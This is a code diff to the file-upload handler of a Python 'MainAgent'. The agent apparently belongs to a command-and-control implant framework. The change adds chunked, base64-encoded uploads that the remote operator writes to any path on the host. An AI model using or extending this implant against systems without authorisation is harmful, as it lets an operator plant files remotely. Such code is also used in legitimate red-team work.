@@ -462,19 +462,35 @@ class MainAgent:
 
     def file_upload(self, data, result_id):
         """
-        Upload a file to the server.
+        Upload a file to the agent.
         Task 42
+        Supports chunked format: "index|total|path|data" or legacy: "path|data"
         """
+        filePath = "<unknown>"
         try:
-            parts = data.split("|")
-            filePath = parts[0]
-            base64part = parts[1]
+            parts = data.split("|", 3)
+            if len(parts) == 4 and parts[0].isdigit():
+                chunk_index = int(parts[0])
+                total_chunks = int(parts[1])
+                filePath = parts[2]
+                base64part = parts[3]
+            elif len(parts) >= 2:
+                chunk_index = 0
+                total_chunks = 1
+                filePath = parts[0]
+                base64part = parts[1]
+            else:
+                raise ValueError("Unexpected upload format: got %d parts" % len(parts))
             raw = base64.b64decode(base64part)
-            with open(filePath, "ab") as f:
+            mode = "wb" if chunk_index == 0 else "ab"
+            with open(filePath, mode) as f:
                 f.write(raw)
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    42, "[*] Upload of %s successful" % (filePath), result_id
+                    42,
+                    "[*] Upload of %s successful (chunk %d/%d)"
+                    % (filePath, chunk_index + 1, total_chunks),
+                    result_id,
                 )
             )
             self.tasks[result_id]["status"] = "completed"
